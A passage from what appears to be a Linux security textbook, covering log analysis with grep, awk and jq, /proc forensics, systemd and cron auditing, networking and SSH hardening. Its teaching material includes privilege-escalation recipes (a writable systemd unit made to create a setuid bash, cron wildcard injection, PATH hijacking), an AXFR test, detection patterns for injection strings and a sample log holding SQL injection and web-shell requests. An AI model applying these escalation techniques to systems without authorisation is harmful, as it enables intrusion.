strings -a -n 6 -t x suspicious_binary | grep -iE "(http|ssh|pass|key|token|/bin/|/etc/|socket)"

# 3. Inspect raw hexadecimal and ASCII layout of the first 64 bytes using xxd
xxd -l 64 /bin/ls
# 00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
# Notice the ELF magic header: 0x7f 'E' 'L' 'F'

# 4. Reversible hex patching with xxd: dump to hex, edit bytes, and convert back (-r) to binary
xxd binary_sample > sample.hex
# (After modifying bytes in sample.hex)
xxd -r sample.hex > binary_patched
```

### 7.2.3 `base64` and `openssl` CLI — Encoding, Hashing, TLS Inspection & Encryption
```bash
# 1. Encode a multi-line script into a single-line Base64 string (-w 0 disables 76-char line wrapping!)
base64 -w 0 payload.sh

# 2. Decode a Base64-encoded JWT header/payload or obfuscated command safely
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null; echo

# 3. Generate a cryptographically secure 32-byte (256-bit) random API secret in hex or base64
openssl rand -hex 32
openssl rand -base64 32

# 4. Encrypt and decrypt sensitive report archives using AES-256-CBC with PBKDF2 (100,000 iterations)
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -in client_findings.tar.gz -out client_findings.tar.gz.enc
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -in client_findings.tar.gz.enc -out client_findings.tar.gz

# 5. Inspect a remote server's TLS certificate chain, SANs (Subject Alternative Names), and expiry date
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \
    | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```

---

## 7.3 Text Processing Mastery for Log Analysis & Telemetry Parsing

When investigating an intrusion on a headless Linux server where Splunk or ELK is unavailable, your ability to chain `grep`, `sed`, `awk`, `cut`, `sort`, `uniq`, `jq`, and `xargs` turns raw multi-gigabyte log files into an instant SIEM.

### 7.3.1 `grep` / `grep -E` / `grep -P` — High-Speed Regular Expression Hunting
- **`-E` (Extended Regex)**: Enables `+`, `?`, `|`, `()` without backslash escaping.
- **`-P` (Perl-Compatible Regex)**: Enables lookaheads, lookbehinds, and `\d`, `\s`, `\w`.
- **`-o` (Only Matching)**: Prints *only* the exact matched substring rather than the entire line (essential for extracting IPs, URLs, or emails).
- **`-i` (Case-insensitive)**, **`-v` (Invert match / exclude)**, **`-n` (Line numbers)**, **`-r` (Recursive)**, **`-C 3` (3 lines of context before and after)**.

```bash
# 1. Extract all unique IPv4 addresses from an Nginx access log using -oE
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/nginx/access.log | sort -u

# 2. Hunt for SQL Injection, Path Traversal, and Command Injection payloads in web access logs
grep -iE "(\%27|\'|union.*select|concat\(|\.\./|\.\.%2f|/etc/passwd|cmd=|exec\(|;.*whoami)" /var/log/nginx/access.log

# 3. Search a codebase recursively for hardcoded AWS Access Key IDs (AKIA / ASIA + 16 uppercase alphanumeric chars)
grep -rnE "(AKIA|ASIA)[0-9A-Z]{16}" /var/www/ /opt/ 2>/dev/null
```

### 7.3.2 `awk` — The Programmable Columnar Data & State Machine Engine
Unlike `cut` (which only splits on a single character and fails when logs have multiple consecutive spaces), **`awk`** splits on arbitrary whitespace or regex field separators (`-F`), supports associative arrays, mathematical conditions, and `BEGIN`/`END` blocks.

Consider a standard Nginx Combined Access Log line:
```text
203.0.113.88 - - [02/Nov/2026:14:22:10 +0530] "POST /wp-login.php HTTP/1.1" 200 4512 "-" "python-requests/2.31.0"
```
In default whitespace-delimited `awk`:
- `$1` = Client IP (`203.0.113.88`)
- `$4` = Timestamp (`[02/Nov/2026:14:22:10`)
- `$6` = HTTP Method (`"POST`)
- `$7` = Request URI (`/wp-login.php`)
- `$9` = HTTP Status Code (`200`)
- `$10` = Response Bytes (`4512`)

```bash
# 1. Top 10 source IP addresses generating HTTP 401/403/404 status codes (Brute-force / Directory fuzzing detection)
awk '$9 ~ /^(401|403|404)$/ { count[$1]++ } END { for (ip in count) print count[ip], ip }' /var/log/nginx/access.log \
    | sort -rn | head -n 10

# 2. Identify potential data exfiltration: Sum total response bytes ($10) transferred per client IP ($1) in Megabytes
awk '{ bytes[$1] += $10 } END { for (ip in bytes) printf "%10.2f MB  %s\n", bytes[ip]/(1024*1024), ip }' /var/log/nginx/access.log \
    | sort -rn | head -n 10

# 3. Audit /etc/passwd for any account (other than root) with UID 0 ($3 == 0)
awk -F: '$3 == 0 && $1 != "root" { print "CRITICAL ALERT: Non-root UID 0 account found -> " $0 }' /etc/passwd

# 4. Audit /etc/shadow for any account with an empty password hash ($2 == "")
sudo awk -F: '$2 == "" { print "CRITICAL ALERT: Passwordless account -> " $1 }' /etc/shadow
```

### 7.3.3 `sed` — Stream Editing, Log Sanitization & In-Place Hardening
```bash
# 1. Redact sensitive Bearer JWT tokens from a log file before sharing with third-party support
sed -E 's/Bearer [A-Za-z0-9._-]+/Bearer [REDACTED_JWT]/g' app_debug.log > app_debug_sanitized.log

# 2. Strip comment lines (#) and blank lines when auditing configuration files (e.g., sshd_config)
sed -E '/^\s*(#|$)/d' /etc/ssh/sshd_config

# 3. Harden /etc/ssh/sshd_config in-place (-i.bak creates a backup file first!)
sudo sed -i.bak -E 's/^#?PermitRootLogin\s+.*/PermitRootLogin no/' /etc/ssh/sshd_config
```

### 7.3.4 `cut`, `tr`, `sort`, `uniq`, `wc`, `head`, `tail`, and `xargs`
```bash
# 1. Classic Pipeline: Extract the top 15 most frequently requested URL paths from access.log
awk '{print $7}' /var/log/nginx/access.log | cut -d'?' -f1 | sort | uniq -c | sort -rn | head -n 15

# 2. Normalize case with 'tr' and count total unique subdomains discovered during reconnaissance
cat subdomains_raw.txt | tr '[:upper:]' '[:lower:]' | sort -u | tee subdomains_clean.txt | wc -l

# 3. Parallelized execution with 'xargs -P' (Run 10 parallel curl status probes across clean subdomains)
cat subdomains_clean.txt | xargs -I {} -P 10 sh -c 'code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "https://{}"); echo "$code https://{}"'
```

### 7.3.5 `jq` — Parsing Structured JSON Telemetry (CloudTrail, Wazuh, Docker, Suricata)
Modern security telemetry—AWS CloudTrail logs, Wazuh `alerts.json`, Suricata `eve.json`, Docker `inspect` output, and REST API responses—is structured as **JSON** or **JSON Lines (JSONL)**. Never parse nested JSON with fragile regex when **`jq`** provides exact structural querying:

```bash
# 1. Inspect Docker container security posture: extract Container Name, Privileged status, and Host Volume Mounts
docker ps -q | xargs docker inspect | jq -r '.[] | {
    Name: .Name,
    Privileged: .HostConfig.Privileged,
    CapAdd: .HostConfig.CapAdd,
    Mounts: [.Mounts[] | "\(.Source) -> \(.Destination) (RW:\(.RW))"]
}'

# 2. Parse Wazuh SIEM alerts (/var/ossec/logs/alerts/alerts.json) for High/Critical alerts (level >= 10)
sudo jq -c 'select(.rule.level >= 10) | {
    time: .timestamp,
    level: .rule.level,
    description: .rule.description,
    mitre_id: .rule.mitre.id,
    srcip: .data.srcip,
    agent: .agent.name
}' /var/ossec/logs/alerts/alerts.json | tail -n 20

# 3. Parse AWS CloudTrail JSON logs to hunt for ConsoleLogin failures or root account usage
jq -r '.Records[] | select(.eventName == "ConsoleLogin" and .responseElements.ConsoleLogin == "Failure") |
    "\(.eventTime) | IP: \(.sourceIPAddress) | User: \(.userIdentity.userName // .userIdentity.type) | MFA: \(.additionalEventData.MFAUsed)"' cloudtrail_events.json
```

---

## 7.4 Chapter 7 Hands-On Lab Exercises & Review Questions

### Lab 7.1: Web Intrusion Forensics via CLI Log Analysis
Generate a sample web attack log file `/tmp/incident_access.log` and write one-liner pipelines using `awk`, `grep`, `sort`, and `uniq` to answer:
1. Which source IP address performed directory brute-forcing (highest number of `404` responses)?
2. Which specific URI endpoint received SQL injection payloads (`UNION SELECT`)?
3. At what exact timestamp did the attacker successfully upload and request `/uploads/shell.php` (`HTTP 200`)?

```bash
cat << 'EOF' > /tmp/incident_access.log
192.168.56.20 - - [02/Nov/2026:10:01:01 +0530] "GET /index.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
198.51.100.77 - - [02/Nov/2026:10:02:11 +0530] "GET /admin HTTP/1.1" 404 162 "-" "gobuster/3.6"
198.51.100.77 - - [02/Nov/2026:10:02:12 +0530] "GET /backup.zip HTTP/1.1" 404 162 "-" "gobuster/3.6"
198.51.100.77 - - [02/Nov/2026:10:02:13 +0530] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "gobuster/3.6"
198.51.100.77 - - [02/Nov/2026:10:05:40 +0530] "GET /item.php?id=1%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1" 200 8420 "-" "sqlmap/1.8"
198.51.100.77 - - [02/Nov/2026:10:08:19 +0530] "POST /upload.php HTTP/1.1" 200 310 "-" "Mozilla/5.0"
198.51.100.77 - - [02/Nov/2026:10:08:45 +0530] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 94 "-" "curl/8.5.0"
EOF
```

### Chapter 7 Review Questions
1. Why does `command > output.log 2>&1` capture both `stdout` and `stderr` into `output.log`, whereas `command 2>&1 > output.log` still prints `stderr` to the terminal screen?
2. How does a Named Pipe (`mkfifo`) differ from a regular temporary file on disk in terms of kernel memory buffering and forensic persistence?
3. Why should a security engineer always include `-w 0` when encoding long payloads with GNU `base64` on Linux?
4. Write an `awk` command that inspects `/etc/passwd` and prints the username and login shell of all accounts whose UID is $\ge 1000$ and whose shell is *not* `/usr/sbin/nologin` or `/bin/false`.
5. How does `jq -c 'select(.rule.level >= 12)'` simplify incident triage on JSON Lines (`JSONL`) SIEM logs compared to multiline `grep`?

---

# Chapter 8: Process, Memory, Storage & Service Administration

## 8.1 Process Internals, `/proc/<PID>/` Forensics, and Linux Signals

Every running program on Linux is an instance of a **Process (`task_struct` in the Linux kernel)** identified by a unique **Process ID (`PID`)** and linked to its **Parent Process ID (`PPID`)**.

### 8.1.1 Inspecting Process Trees (`ps auxf`, `pstree`, `top`, `htop`)
When hunting for web shells, reverse shells, or malware during an incident response engagement, looking at flat process lists is insufficient—you must inspect the **Process Lineage (Parent-Child Hierarchy)**:

```bash
# Display full process hierarchy tree (-f = ASCII forest tree, a = all users, u = user-oriented format, x = include processes without a controlling tty)
ps auxf

# Example anomalous process lineage indicating a web shell RCE on an Nginx/PHP-FPM server:
# root         912  0.0  0.2  54212  8120 ?        Ss   08:00   0:00 php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)
# www-data     945  0.1  0.4  54890 14200 ?        S    08:00   0:02  \_ php-fpm: pool www
# www-data   18422  0.0  0.0   2892  1024 ?        S    14:19   0:00      \_ /bin/sh -c /tmp/.cache_upd
# www-data   18423  0.2  0.1  14210  4120 ?        Sl   14:19   0:01          \_ /tmp/.cache_upd
```

Notice how `ps auxf` immediately exposes the intrusion: a worker process (`php-fpm: pool www` running as `www-data`) should **never** spawn `/bin/sh` or a hidden binary in `/tmp`!

### 8.1.2 Live Memory & Process Forensics via `/proc/<PID>/`
Even if an attacker deletes their malicious binary from disk immediately after launching it (`rm -f /tmp/.cache_upd`), or overwrites `argv[0]` to masquerade as `[kworker/u4:0]` in `ps` output, the Linux kernel maintains the true execution state inside `/proc/<PID>/` for as long as the process remains alive in RAM!

| `/proc/<PID>/` Artifact | Kernel Telemetry Exposed | Incident Response & Forensics Command |
| :--- | :--- | :--- |
| **`/proc/<PID>/cmdline`** | Null-byte (`\0`) separated command-line arguments passed to `execve()`. | `tr '\0' ' ' < /proc/18423/cmdline; echo` |
| **`/proc/<PID>/exe`** | Symbolic link pointing directly to the actual binary inode executing in RAM—even if deleted from disk! | `ls -l /proc/18423/exe` *(Shows `/tmp/.cache_upd (deleted)`)*<br>**Recover deleted malware binary directly from RAM**:<br>`cp /proc/18423/exe /root/recovered_malware.elf` |
| **`/proc/<PID>/cwd`** | Symbolic link to the process's Current Working Directory. | `ls -l /proc/18423/cwd` |
| **`/proc/<PID>/environ`** | Null-byte separated environment variables inherited at process startup (frequently leaks `AWS_SECRET_ACCESS_KEY`, `DB_PASSWORD`, or `SSH_CONNECTION` IP of the attacker!). | `tr '\0' '\n' < /proc/18423/environ` |
| **`/proc/<PID>/fd/`** | Directory containing symlinks to every open **File Descriptor** (files, pipes, and network sockets). | `ls -la /proc/18423/fd/` |
| **`/proc/<PID>/maps`** | Virtual memory address layout (code text segment, heap, stack, and loaded `.so` shared libraries—reveals injected `LD_PRELOAD` rootkits). | `cat /proc/18423/maps` |
| **`/proc/<PID>/status`** | Real, Effective, Saved, and Filesystem UIDs/GIDs, `CapEff` (Effective Capabilities bitmask), and `Seccomp` mode. | `grep -E '^(Name|Pid|PPid|Uid|Gid|CapEff|Seccomp):' /proc/18423/status` |

```bash
# Decode a process's hexadecimal Effective Capabilities bitmask from /proc/<PID>/status into human-readable names:
capsh --decode="$(awk '/^CapEff:/ {print $2}' /proc/1/status)"
```

### 8.1.3 Linux Signals & Process Control (`kill`, `pkill`, `killall`)
Signals are software interrupts delivered by the kernel to notify a process of an event:

| Signal Name | Number (`x86_64`) | Default Action | Can Process Catch/Ignore? | Security & Operational Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`SIGHUP`** | `1` (`-HUP`) | Terminate | Yes | Instructs daemons (`sshd`, `nginx`, `rsyslogd`) to **reload their configuration files** gracefully without dropping active connections. |
| **`SIGINT`** | `2` (`-INT`) | Terminate | Yes | Sent by pressing `Ctrl+C` in the controlling terminal. |
| **`SIGQUIT`** | `3` (`-QUIT`) | Core Dump | Yes | Sent by `Ctrl+\`; terminates process and writes a memory core dump (if `ulimit -c` permits). |
| **`SIGKILL`** | `9` (`-KILL`) | Terminate Immediately | **NO (Handled directly by Kernel)** | Unconditionally terminates a rogue or malicious process at the kernel scheduler level; the process cannot run cleanup handlers. |
| **`SIGTERM`** | `15` (`-TERM`) | Terminate Gracefully | Yes (Default of `kill <PID>`) | Standard request asking a service to flush buffers, close sockets, and exit cleanly. |
| **`SIGSTOP`** | `19` (`-STOP`) | Pause Execution | **NO (Handled directly by Kernel)** | **DFIR Pro-Tip**: If a malicious process has a watchdog that respawns it whenever it is killed with `SIGKILL`, freeze the process in RAM using `kill -STOP <PID>` so it cannot execute instructions or exit while you dump `/proc/<PID>/`! |
| **`SIGCONT`** | `18` (`-CONT`) | Resume Execution | Yes | Resumes a paused (`SIGSTOP` / `SIGTSTP`) process. |

---

## 8.2 Background Job Control & Complete `tmux` Reference

### 8.2.1 Shell Job Control (`&`, `jobs`, `fg`, `bg`, `disown`, `nohup`)
```bash
# 1. Launch a long-running scan in the background
nmap -sV -p- 192.168.56.101 -oA full_scan >/dev/null 2>&1 &

# 2. List active background/suspended jobs in the current shell session (-l shows PIDs)
jobs -l

# 3. Suspend a currently running foreground command with Ctrl+Z (sends SIGTSTP), then resume it in the background:
bg %1

# 4. Bring background job #1 back to the foreground:
fg %1

# 5. Prevent a background job from being killed by SIGHUP when your SSH session disconnects:
nohup ./long_audit.sh > audit_out.log 2>&1 &
# Or detach an already-running job from the shell's job table:
disown -h %1
```

### 8.2.2 Complete `tmux` Operational Cheat Sheet
 *(Assuming default prefix `Ctrl+b`, or `Ctrl+a` if using the custom `~/.tmux.conf` from Chapter 5)*:

| Category | Command / Keybinding | Operational Description |
| :--- | :--- | :--- |
| **Session Management** | `tmux new -s pentest` | Create a new named session (`pentest`). |
| | `tmux ls` | List all active background `tmux` sessions on the host. |
| | `tmux attach -t pentest` | Re-attach to an existing detached session (`pentest`). |
| | `<Prefix> d` | Detach from the current session (processes keep running in background). |
| | `<Prefix> $` | Rename the current session. |
| **Window Management** | `<Prefix> c` | Create a new window (tab). |
| | `<Prefix> ,` | Rename the current window (e.g., `recon`, `c2-listener`, `exploit`). |
| | `<Prefix> n` / `<Prefix> p` | Switch to Next / Previous window. |
| | `<Prefix> 0` .. `9` | Jump directly to window number `0`–`9`. |
| **Pane Management** | `<Prefix> %` (or `<Prefix> \|`) | Split current pane vertically (left/right). |
| | `<Prefix> "` (or `<Prefix> -`) | Split current pane horizontally (top/bottom). |
| | `<Prefix> Arrow-Key` | Move focus between panes. |
| | `<Prefix> z` | **Toggle Pane Zoom** (maximize current pane to full screen and restore). |
| | `<Prefix> x` | Close current pane. |
| **Copy Mode & Search** | `<Prefix> [` | Enter Copy/Scrollback Mode (use Vi keys `j`/`k`/`Ctrl+u`/`Ctrl+d` to scroll). |
| | `/` or `?` (inside Copy Mode) | Search forward (`/`) or backward (`?`) through terminal output history! |
| | `Space` $\rightarrow$ `Enter` (or `v` $\rightarrow$ `y`) | Highlight text in Copy Mode and yank to `tmux` buffer. |
| | `<Prefix> ]` | Paste yanked buffer into the active terminal pane. |

---

## 8.3 `systemd` Service Administration, Unit Authoring & Sandboxing

Modern enterprise Linux distributions (Ubuntu, Debian, RHEL, Rocky, Kali, Arch) use **`systemd`** to manage daemons, sockets, timers, and resource control groups (`cgroups v2`).

### 8.3.1 Essential `systemctl` and `journalctl` Operations
```bash
# 1. List all currently active running service daemons
systemctl list-units --type=service --state=running

# 2. Inspect full status, CGroup process tree, unit file path, and recent logs of a service
systemctl status ssh.service

# 3. Start, stop, restart, reload configuration, enable at boot, or mask a service
sudo systemctl reload nginx.service
sudo systemctl enable --now wazuh-agent.service
sudo systemctl mask rpcbind.service   # Symlinks unit to /dev/null so it cannot be started even manually!

# 4. Query structured systemd journal logs for a specific service within a forensic time window
sudo journalctl -u ssh.service --since "2026-11-02 00:00:00" --until "2026-11-02 15:00:00" --no-pager

# 5. Audit existing systemd services for their security sandboxing exposure score (0.0 = Secure, 10.0 = Unsafe)
systemd-analyze security
systemd-analyze security nginx.service
```

### 8.3.2 Auditing `systemd` for Persistence & Privilege Escalation
Unit files are loaded in priority order from:
1. `/etc/systemd/system/` (Local administrator overrides & custom units — **Highest Priority**)
2. `/run/systemd/system/` (Runtime ephemeral units)
3. `/lib/systemd/system/` or `/usr/lib/systemd/system/` (Vendor package defaults)

**Privilege Escalation Check**: If a `.service` file running as `root` (the default when `User=` is omitted) is writable by a non-root user—or if the binary/script referenced in `ExecStart=` is writable by a non-root user—modifying `ExecStart=` to copy `/bin/bash` to `/tmp/rootbash` and set `chmod 4755 /tmp/rootbash` yields `root` as soon as the service restarts or the server reboots!

```bash
# Find any systemd unit files or scripts in /etc/systemd or /lib/systemd writable by current user
find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
```

### 8.3.3 Writing a Hardened, Sandboxed `systemd` Service Unit
Suppose you deploy a custom Python security webhook microservice (`/opt/sec-webhook/app.py`). If an attacker discovers a Remote Code Execution (RCE) bug in your Python app, running it under a default `systemd` unit gives them full access to the server filesystem.
By utilizing **`systemd` native security sandboxing directives** (which configure Linux namespaces, Capabilities, and `seccomp-bpf` filters automatically), you can trap the service in an inescapable jail!

Create `/etc/systemd/system/sec-webhook.service`:

```ini
[Unit]
Description=Hardened Security Telemetry Webhook Microservice
Documentation=https://internal.sec.example.lk/docs/webhook
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
# 1. Identity Isolation: Never run application services as root!
User=secwebhook
Group=secwebhook
WorkingDirectory=/opt/sec-webhook
ExecStart=/opt/sec-webhook/venv/bin/gunicorn --bind 127.0.0.1:8443 app:app
Restart=on-failure
RestartSec=5s

# 2. Privilege & Capability Restrictions
NoNewPrivileges=yes
CapabilityBoundingSet=
AmbientCapabilities=
RestrictSUIDSGID=yes

# 3. Filesystem Namespace Sandboxing (Chroot-like isolation via Mount Namespaces)
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectKernelLogs=yes
ProtectControlGroups=yes
ReadWritePaths=/var/log/sec-webhook
ReadOnlyPaths=/opt/sec-webhook

# 4. Network & Kernel Attack Surface Reduction
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
MemoryDenyWriteExecute=yes
LockPersonality=yes
RestrictNamespaces=yes
RestrictRealtime=yes
SystemCallArchitectures=native
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources @mount @reboot @swap @obsolete
UMask=0027

[Install]
WantedBy=multi-user.target
```

After creating or editing any unit file, reload the daemon and verify its hardened score:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now sec-webhook.service
systemd-analyze security sec-webhook.service
# Result: Overall exposure level for sec-webhook.service: 1.2 OK :-)
```

---

## 8.4 Scheduled Tasks: Cron Architecture & `systemd` Timers

### 8.4.1 The Complete Cron Hierarchy
Attackers use cron for persistence (`T1053.003`), while defenders use it for automated auditing and backups. When auditing a Linux host for scheduled tasks, you must inspect **all six locations**:
1. **`/etc/crontab`**: System-wide crontab. Includes an explicit `username` column (6th field) before the command.
2. **`/etc/cron.d/`**: Drop-in system cron jobs created by packages or admins (also includes the `username` field).
3. **`/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`**: Executable scripts run periodically via `run-parts`.
4. **`/var/spool/cron/crontabs/<username>`** (Debian/Ubuntu) or **`/var/spool/cron/<username>`** (RHEL): Per-user crontabs edited via `crontab -e` (does **not** have a `username` column).
5. **`/etc/anacrontab`**: Executes missed daily/weekly/monthly jobs on machines that are not powered on 24/7.
6. **Systemd Timers (`systemctl list-timers --all`)**: Modern replacement for cron jobs triggered by `.timer` units.

```text
# Anatomy of a /etc/crontab or /etc/cron.d/ entry:
# +---------------- minute (0 - 59)
# |  +------------- hour (0 - 23)
# |  |  +---------- day of month (1 - 31)
# |  |  |  +------- month (1 - 12)
# |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)
# |  |  |  |  |   + username (ONLY in /etc/crontab and /etc/cron.d/*)
# |  |  |  |  |   |      + command to be executed
  */5 *  *  *  *  root   /usr/local/sbin/health_check.sh >/dev/null 2>&1
```

#### Auditing Cron for Privilege Escalation (`pspy`)
Three fatal mistakes in `root` cron jobs lead to instant privilege escalation:
1. **Writable Script**: `/usr/local/sbin/health_check.sh` is owned by a non-root user or has `0777` / group-writable permissions.
2. **Relative Path Hijacking**: `/etc/crontab` defines `PATH=/home/admin/bin:/usr/local/sbin:/usr/bin:/bin` and the cron job invokes `health_check.sh` without a leading `/`, allowing an attacker to drop a malicious `/home/admin/bin/health_check.sh`.
3. **Unquoted Wildcards (`*`)**: A root cron job runs `cd /var/www/uploads && tar czf /backups/uploads.tgz *`, enabling GNU `tar` `--checkpoint` flag injection.

Even when a low-privilege user cannot read `/var/spool/cron/crontabs/root`, they can watch `/proc` in real time using **`pspy`** (or a fast Bash loop polling `/proc/[0-9]*/cmdline`) to catch short-lived cron processes the millisecond `cron` spawns them!

---

## 8.5 Chapter 8 Hands-On Lab Exercises & Review Questions

### Lab 8.1: Live `/proc/<PID>/` Forensics on a "Deleted" Binary
Simulate a fileless/deleted-binary intrusion in your terminal and recover the binary from RAM:
```bash
# 1. Copy /bin/sleep to /tmp/stealth_beacon, run it in background for 300 seconds, and immediately delete the file from disk!
cp /bin/sleep /tmp/stealth_beacon
/tmp/stealth_beacon 300 &
BEACON_PID=$!
rm -f /tmp/stealth_beacon

# 2. Verify that /tmp/stealth_beacon no longer exists in /tmp
ls -la /tmp/stealth_beacon || echo "File is gone from disk!"

# 3. Inspect the live process in /proc/$BEACON_PID/
ls -la "/proc/$BEACON_PID/exe"
tr '\0' ' ' < "/proc/$BEACON_PID/cmdline"; echo

# 4. Recover the deleted ELF binary directly from the /proc/$BEACON_PID/exe symlink and verify its SHA-256 hash matches /bin/sleep!
cp "/proc/$BEACON_PID/exe" /tmp/recovered_beacon.elf
sha256sum /bin/sleep /tmp/recovered_beacon.elf

# 5. Clean up
kill -9 "$BEACON_PID" && rm -f /tmp/recovered_beacon.elf
```

### Chapter 8 Review Questions
1. If an attacker deletes their malicious ELF executable from `/tmp` immediately after launching it, how can an incident responder recover an exact byte-for-byte copy of the binary without using disk carving tools?
2. Why is sending `SIGSTOP` (`kill -19 <PID>`) sometimes preferable to `SIGKILL` (`kill -9 <PID>`) during live incident response against multi-process malware?
3. What is the difference between `/etc/crontab` and a user crontab (`crontab -e`) in terms of syntax columns and filesystem storage location?
4. Explain what the `systemd` unit directives `NoNewPrivileges=yes`, `ProtectSystem=strict`, and `PrivateTmp=yes` enforce at the kernel level.

---

# Chapter 9: Linux Networking, SSH Architecture & Firewall Hardening

## 9.1 The Modern Linux Network Stack (`iproute2`, `ss`, `lsof`, and DNS Resolution)

Legacy `net-tools` utilities (`ifconfig`, `route`, `arp`, `netstat`) have been deprecated for over a decade because they read slow `/proc/net/*` text files and cannot express modern Linux kernel networking features (policy routing, network namespaces, VXLANs, WireGuard). Elite security engineers use the **`iproute2`** suite (`ip` and `ss`), which communicates directly with the kernel via `netlink` sockets.

### 9.1.1 Mastering the `ip` Command Suite
```bash
# 1. Inspect IPv4/IPv6 addresses and interface link states in concise colorized table format (-br = brief, -c = color)
ip -br -c addr show
ip -br -c link show

# 2. Inspect full interface details including MAC addresses, MTU, packet drop counters (-s = statistics)
ip -s link show dev eth0

# 3. Inspect the kernel IPv4 routing table and query which exact interface/gateway will route packets to a specific target IP
ip route show
ip route get 10.20.30.40

# 4. Inspect the ARP / Neighbor cache (Layer 2 MAC-to-IPv4 mappings) to discover live hosts on the local subnet passively!
ip neigh show
# States: REACHABLE (actively confirmed), STALE (cached, needs verification), FAILED (host did not respond to ARP Who-Has)

# 5. Add or remove a temporary secondary IP address or static route during an internal network assessment
sudo ip addr add 192.168.56.250/24 dev eth1
sudo ip route add 10.100.0.0/16 via 192.168.56.1 dev eth1
```

### 9.1.2 Auditing Network Sockets with `ss` and `lsof`
During both defensive triage (spotting unauthorized listening backdoors or outbound C2 connections) and offensive local enumeration (finding internal services bound exclusively to `127.0.0.1` for port forwarding), **`ss`** is your primary instrument:

```bash
# 1. List all listening (-l) TCP (-t) and UDP (-u) sockets with numeric ports (-n) and owning process/PID (-p)
sudo ss -tulnp

# Sample Output:
# Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
# tcp    LISTEN  0       511     0.0.0.0:443          0.0.0.0:*          users:(("nginx",pid=1102,fd=6))
# tcp    LISTEN  0       128     127.0.0.1:6379       0.0.0.0:*          users:(("redis-server",pid=980,fd=6))
# tcp    LISTEN  0       80      127.0.0.1:3306       0.0.0.0:*          users:(("mariadbd",pid=1044,fd=21))
```

*Security Insight*: Look at `127.0.0.1:6379` (`redis-server`) and `127.0.0.1:3306` (`mariadbd`). An external `nmap` scan against this server's public IP will **never** see ports `6379` or `3306` because they are bound to the loopback interface (`127.0.0.1`). However, once you have a low-privilege shell or an SSRF vulnerability on the host, you can interact with Redis and MariaDB locally or forward them over SSH!

```bash
# 2. List all established (-o state established) outbound/inbound TCP connections with timers and process owners
sudo ss -tonp state established

# 3. Using 'lsof' (List Open Files) to inspect network connections by port, protocol, or user
sudo lsof -i -P -n
sudo lsof -i TCP:443 -P -n
sudo lsof -i -u www-data -P -n   # Immediately shows any network socket opened by the web server user!
```

### 9.1.3 Name Resolution Architecture (`/etc/nsswitch.conf`, `/etc/hosts`, `/etc/resolv.conf`, `dig`)
When a Linux application calls `getaddrinfo("internal-db.corp.lk")`, the C library checks `/etc/nsswitch.conf`:
```text
hosts: files dns
```
1. **`files` (`/etc/hosts`)**: Checked *first* before any DNS query is sent over the network!
   - *Offensive Use*: Adding `10.10.11.245 internal-vhost.htb` to `/etc/hosts` allows accessing name-based Virtual Hosts in Apache/Nginx.
   - *Defensive Check*: Verify attackers haven't poisoned `/etc/hosts` to redirect update servers or security telemetry domains to `127.0.0.1`.
2. **`dns` (`/etc/resolv.conf`)**: Specifies upstream recursive DNS `nameserver` IPs (or `127.0.0.53` when `systemd-resolved` stub resolver is active).

#### Mastering `dig` (Domain Information Groper) for DNS Reconnaissance & Auditing
```bash
# 1. Query A, AAAA, MX, TXT (SPF/DMARC), and NS records cleanly (+short)
dig example.com A +short
dig example.com TXT +short
dig _dmarc.example.com TXT +short

# 2. Perform a Reverse DNS (PTR) lookup on an IP address
dig -x 203.0.113.10 +short

# 3. Test an authoritative DNS server (@ns1.target.lab) for a misconfigured DNS Zone Transfer (AXFR - CWE-200)
# If successful, AXFR dumps every internal and external hostname in the entire zone at once!
dig @192.168.56.101 internal.corp.lab AXFR
```

---

## 9.2 SSH Architecture, Hardening, and Advanced Tunneling Mastery

OpenSSH (`sshd`) is the administrative backbone of Linux infrastructure—and simultaneously the primary tool used by security engineers for encrypted pivoting and port forwarding.

### 9.2.1 Asymmetric Key Cryptography: Generating `Ed25519` Keys
Never use legacy 1024-bit RSA or DSA keys. Modern cryptographic engineering standardizes on **Ed25519** (Edwards-curve Digital Signature Algorithm over Curve25519), which provides 128-bit security strength equivalent to ~3072-bit RSA, constant-time execution immune to timing side-channel attacks, and compact 68-character public keys:

```bash
# Generate an Ed25519 SSH keypair using 100 KDF rounds (-a 100) to protect the private key at rest with a strong passphrase
ssh-keygen -t ed25519 -a 100 -C "sithum@sec-workstation-2026" -f ~/.ssh/id_ed25519_prod

# Enforce strict POSIX permissions required by OpenSSH (sshd will reject keys if permissions are too open!)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519_prod
chmod 644 ~/.ssh/id_ed25519_prod.pub

# Install public key onto remote server's ~/.ssh/authorized_keys safely
ssh-copy-id -i ~/.ssh/id_ed25519_prod.pub secadmin@192.168.56.105
```

### 9.2.2 Production Hardening of `/etc/ssh/sshd_config`
Below is a CIS-compliant, production-hardened `/etc/ssh/sshd_config` drop-in configuration (`/etc/ssh/sshd_config.d/99-hardening.conf`):

```sshconfig
# /etc/ssh/sshd_config.d/99-hardening.conf
Protocol 2
Port 22

# 1. Authentication Hardening: Disable root login and cleartext password authentication
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
